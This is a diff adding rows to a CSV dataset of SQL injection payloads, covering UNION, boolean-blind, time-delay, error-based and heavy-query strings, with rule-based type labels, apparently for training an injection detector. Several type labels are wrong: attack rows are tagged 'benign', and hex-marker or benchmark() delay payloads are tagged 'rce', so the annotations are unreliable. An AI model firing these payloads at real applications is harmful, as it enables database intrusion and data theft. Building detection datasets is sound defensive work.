@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+9330,1'+ ( select wpkh where 5842 = 5842,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9331,"1'|| ( select 'ylek' where 3803 = 3803 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||'",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
+9332,1 ) where 5866 = 5866 and 4595 = 4595#,1,,boolean_blind,generic,0.95,5866 = 5866 and detected — boolean_blind injection (priority 8) on generic,rule-based
+9333,"-2204'|| ( select 'bwae' from dual where 4884 = 4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
+9334,"1%"" ) and 9764 = 6037 and ( ""%"" = """,1,,boolean_blind,generic,0.95,9764 = 6037 and detected — boolean_blind injection (priority 8) on generic,rule-based
+9335,1' ) as qqyz where 2274 = 2274,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9336,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'qutm' = 'qutm",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+9337,"-9808' in boolean mode ) union all select 2528,2528,2528,2528,2528,2528,2528--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9338,1' ) ) waitfor delay '0:0:5' and ( ( 'jcfe' = 'jcfe,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+9339,"1"" where 7788 = 7788 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
+9340,1' where 4253 = 4253,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9341,"-8966"" ) ) ) or 1628 = 2712",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9342,"1' union all select null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9343,"1, ( select ( case when ( 7734 = 7734 ) then ( select benchmark ( 5000000,md5 ( 0x72747341 ) ) ) else 7734* ( select 7734 from mysql.db ) end ) )",1,,rce,generic,0.95,0x72747341 detected — rce injection (priority 1) on generic,rule-based
+9344,"1' in boolean mode ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+9345,"-5227"" union all select 2666--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9346,"-9176' ) ) as eunw where 5978 = 5978 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+9347,"-3074' ) ) union all select 6131,6131,6131,6131,6131,6131,6131--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9348,1' and sleep ( 5 ) and 'kapr' = 'kapr,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+9349,"1%' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( '%' = '",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+9350,"1 ) where 6720 = 6720 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+9351,"-9698 ) as pvhn where 3223 = 3223 or elt ( 6563 = 9210,9210 ) --",1,,boolean_blind,generic,0.95,3223 = 3223 or detected — boolean_blind injection (priority 8) on generic,rule-based
+9352,"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""mynm"" like ""mynm",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
+9353,-1989%' ) ) or 6179 = 8518#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9354,1'|| ( select 'vwls' where 5252 = 5252 rlike sleep ( 5 ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+9355,-8357' ) ) as henk where 8198 = 8198 or 2558 = 9103#,1,,boolean_blind,generic,0.95,8198 = 8198 or detected — boolean_blind injection (priority 8) on generic,rule-based
+9356,1' ) as yxdb where 4597 = 4597,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9357,-1393' ) ) ) union all select 8280--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9358,"1 where 9869 = 9869 union all select null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9359,select ( case when ( 8294 = 4332 ) then 1 else 8294* ( select 8294 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
